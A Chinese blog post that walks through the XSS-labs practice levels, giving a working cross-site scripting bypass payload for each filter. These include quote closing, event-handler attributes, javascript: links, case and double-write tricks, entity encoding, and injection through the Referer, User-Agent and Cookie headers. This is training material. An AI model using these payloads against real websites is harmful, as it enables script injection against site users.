+<h2 id="XSS-Filter"><a href="#XSS-Filter" class="headerlink" title="XSS Filter"></a>XSS Filter</h2><p>对一些特殊字符进行代码层过滤</p>
+<h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><p>对用户提交的数据进行有效性验证，仅接受指定长度范国内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。</p>
+<h2 id="输出转义"><a href="#输出转义" class="headerlink" title="输出转义"></a>输出转义</h2><p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。htmlspecialchars():把预定义的字符转换为HTML实体。（可以将&lt;&gt;转义）</p>
+<h1 id="基于xss-lab的绕过"><a href="#基于xss-lab的绕过" class="headerlink" title="基于xss-lab的绕过"></a>基于xss-lab的绕过</h1><h2 id="闭合双引号"><a href="#闭合双引号" class="headerlink" title="闭合双引号"></a>闭合双引号</h2><p>分析：输入的内容被双引号带入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230466643-380778b7-9a7b-408c-9b07-71f0cfad274d.png"></p>
+<p>绕过：闭合</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230593933-e0fefd6b-5841-482f-9d89-905eb918f6a7.png"></p>
+<h2 id="实体化绕过（使用不被实体化的字符构造payload）"><a href="#实体化绕过（使用不被实体化的字符构造payload）" class="headerlink" title="实体化绕过（使用不被实体化的字符构造payload）"></a>实体化绕过（使用不被实体化的字符构造payload）</h2><p>使用了htmlspecialchars()函数，实体化一些字符，但默认配置不过滤单引号，构造单引号payload</p>
+<p>分析：闭合单引号</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230708627-d5491690-4969-4ba2-9607-4472d77b9e84.png"></p>
+<p>闭合后发现 符号实体化</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733230743966-61771286-ea04-4d21-8af5-6d6a218b7ff4.png"></p>
+<p>标签为input，使用input的触发事件绕过（闭合单引号之后再进行绕过）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;onmouseover=&#x27;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>鼠标滑过输入框，触发事件</p>
+<h2 id="实体化绕过"><a href="#实体化绕过" class="headerlink" title="实体化绕过"></a>实体化绕过</h2><p>&lt;&gt;被过滤为空，双引号没有被过滤</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232180143-5cff3ac3-cc44-49b8-bced-93a721062942.png"></p>
+<p>使用双引号构造payload，用触发事件绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&quot;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232322426-c873f3af-5f03-4792-9675-df77d5905cf9.png"></p>
+<h2 id="使用其他标签闭合"><a href="#使用其他标签闭合" class="headerlink" title="使用其他标签闭合"></a>使用其他标签闭合</h2><p>分析：script被过滤为scr_ipt</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232494424-a96c992c-b4ae-4d64-885a-d5c3add447b5.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span>javascript:alert(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733232606470-5ed7f164-0cb2-4892-bb89-95095a66dd44.png"></p>
+<p>点击test触发事件绕过</p>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>script被过滤，href也被过滤</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233694713-34240ca5-85cc-458f-a760-46f7a5cdee13.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233749070-dc963604-84d5-4b4d-8a4b-ee59936a6b8e.png"></p>
+<p>使用大小写绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a hRef=&quot;</span>javascript:alert(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>script被过滤为空</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733233849844-9ea48b1d-6e14-4a4a-ac70-1cc901c725cf.png"></p>
+<p>双写绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234397718-c1c63c67-85e9-40e6-b6b8-6a8cd644c1fd.png"></p>
+<p>href标签的payload：&lt;a href&#x3D;”javascript:alert(1)”</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234438374-08a377b8-4ce6-42a1-8a10-12a468e9e1c0.png"></p>
+<p>都有过滤</p>
+<p>使用Unicode编码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234700749-f99e0b9a-ed16-4162-b7d5-17805334cb8b.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234908693-51eb0a56-dbae-4bbf-89bc-d39afc7c8424.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234894678-db3fdd4d-74f2-45b5-88e2-ebfa54fc084b.png"></p>
+<h2 id="Unicode-内容检测绕过"><a href="#Unicode-内容检测绕过" class="headerlink" title="Unicode+内容检测绕过"></a>Unicode+内容检测绕过</h2><p>不管输入什么，参数都没有传入，只有输入http之后参数才会传进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733234967250-894cd123-71c1-498c-85c7-505bfe9c3a86.png"></p>
+<p>猜测在传入href之前会判断字符串中有没有http:&#x2F;&#x2F;</p>
+<p>加入http:&#x2F;&#x2F;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029;(&#x27;http://&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733235595166-8430cec0-bfdc-4e97-bdd0-e813e88c3477.png"></p>
+<p>(http:&#x2F;&#x2F;)只是为了绕过检测，是一个无效的函数调用，浏览器会忽略它，继续执行 alert(1)</p>
+<h2 id="hidden参数传递数据"><a href="#hidden参数传递数据" class="headerlink" title="hidden参数传递数据"></a>hidden参数传递数据</h2><p>源代码中多了这三行内容</p>
+<p>有三个输入框，但是type为隐藏了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236318868-6f23a4ed-330c-4735-b9f0-4bc3fd2abb80.png"></p>
+<p>三个参数分别尝试，只有当传参?t_sort&#x3D;1时，代码中才会接收到参数值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236627652-55c8e27e-b2aa-47cf-b9a8-b88d2e685b4d.png"></p>
+<p>尝试构造payload</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236724144-333e09e0-9aa4-4c47-b275-33893dd8f4d9.png"></p>
+<p>发现会过滤&lt;&gt;</p>
+<p>使用事件触发</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>并将type改为submit，点击按钮</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236813296-a1ed8e3f-f300-4a27-b0be-298422c454d1.png"></p>
+<h2 id="Referer参数传递数据"><a href="#Referer参数传递数据" class="headerlink" title="Referer参数传递数据"></a>Referer参数传递数据</h2><p>仍然是只有t_sort可以接收到参数</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733237087188-4cb11da5-b1fb-459f-8957-ffe4f84e36f8.png"></p>
+<p>修改type，发现t_ref接收返回值参数（Referer请求头参数）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733237926086-9d472c43-face-47b6-b886-f61ebf34fa9e.png"></p>
+<p>尝试构造Referer的payload</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271267752-8aa0f977-bef4-4d4c-ba5c-05c0be00b3c2.png"></p>
+<p>闭合input标签</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271479210-e2daef1d-3757-4dc0-ab26-6fa8dd248346.png"></p>
+<p>是我们想要的结果，抓包之后再放包，页面出现文本框，触发事件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271426787-c9d13d89-c7cd-494d-b463-3246e314035b.png"></p>
+<h2 id="Ua参数传递数据"><a href="#Ua参数传递数据" class="headerlink" title="Ua参数传递数据"></a>Ua参数传递数据</h2><p>发现代码中变成t_ua，通过User-Agent传递数据</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271593145-321e8eb8-9eb3-402a-9cfb-d02839eec055.png"></p>
+<p>?t_link&#x3D;1&amp;t_history&#x3D;2&amp;t_sort&#x3D;3 看是否能接收数据</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271843191-638bef76-26ec-4256-a515-c0a92d2f6ba1.png"></p>
+<p>依旧只有t_sort能够接收（这里谁接收都无所谓，因为有ua）</p>
+<p>我们抓包修改ua头内容，构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272056454-3670bf9a-5074-4720-b555-bbf2955af567.png"></p>
+<p>出现文本框，说明构造成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272073048-19042248-91d3-4b45-b9d4-62c7b487e594.png"></p>
+<p>再抓包修改，放包，点击文本框，按下键盘，触发事件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272118397-9c9bcddd-0b48-4591-ae87-54cc783ab5ed.png"></p>
+<h2 id="Cookie参数传递数据"><a href="#Cookie参数传递数据" class="headerlink" title="Cookie参数传递数据"></a>Cookie参数传递数据</h2><p>盲猜Cookie，抓包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272166221-3bc500f3-be5d-4f63-922a-01f542f22fef.png"></p>
+<p>果然，cookie中user的值传递给t_cook变量</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272211918-0c01bbf7-cc4e-4530-befe-5418d31d89a6.png"></p>
+<p>修改cookie值构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="number">1</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272388729-da62b6d6-fd7f-4f59-804e-dbdf710f7eb4.png"></p>
+<p>再抓包修改，放包，点击文本框，按下键盘，触发事件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272431672-101d967e-9173-4f8d-b8ae-556247e2ee33.png"></p>
+<h2 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif-xss"></a>exif-xss</h2><p>该关的<a target="_blank" rel="noopener" href="http://www.exifviewer.org/">http://www.exifviewer.org/</a>网址已经被弃用，无法复现</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&time__1311=eqGhqfxmxAxRhEDlrmq0=GOR3=q7qRH9vpD#toc-12">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&amp;time__1311&#x3D;eqGhqfxmxAxRhEDlrmq0%3DGOR3%3Dq7qRH9vpD#toc-12</a></p>
+<h2 id="ng-include"><a href="#ng-include" class="headerlink" title="ng-include"></a>ng-include</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276716069-4521f887-d667-47a8-be47-520cdb717cce.png"></p>
+<h2 id="空格被过滤（-0a绕过）"><a href="#空格被过滤（-0a绕过）" class="headerlink" title="空格被过滤（%0a绕过）"></a>空格被过滤（%0a绕过）</h2><p>?keyword&#x3D;test</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276858320-4f68763a-9dca-40a5-8acb-213706c3e4c6.png"></p>
+<p>test被写入<center>标签中</p>
+<p>尝试闭合</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;/center&gt;&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入的&#x2F;、script被过滤为空</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276974528-6ad581e6-c680-4679-94da-e04ec4193ddc.png"></p>
+<p>双写、大小写都不能绕过，Unicode也不能绕过</p>
+<p>script、空格和&#x2F;时转译成&amp;nbsp</p>
+<p>用回车的url编码%0a代替空格</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1733289710240-a283ecb3-2b31-4d54-a5e7-952af4adfb1b.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;img%<span class="number">0</span>asrc=x%0aonerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>center标签不用闭合</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733289754479-0c35757f-a229-4cb0-9c37-d90f6597a456.png"></p>
+<h2 id="embed标签"><a href="#embed标签" class="headerlink" title="embed标签"></a>embed标签</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733289825752-14b5a2e0-baa2-464a-b9fa-f251f0eb47d7.png"></p>
+<p>embed标签已经被弃用，不复现</p>
+<p>level17.php?arg01&#x3D;a&amp;arg02&#x3D;%20onmouseover&#x3D;alert(2)</p>
+<p>后几题都是embed标签</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Attackxu</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/05/27/XSS/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/05/27/XSS/')">XSS</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/05/27/XSS/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=XSS&amp;url=http://example.com/2025/05/27/XSS/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Attackxu の Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/XSS/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>XSS<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a 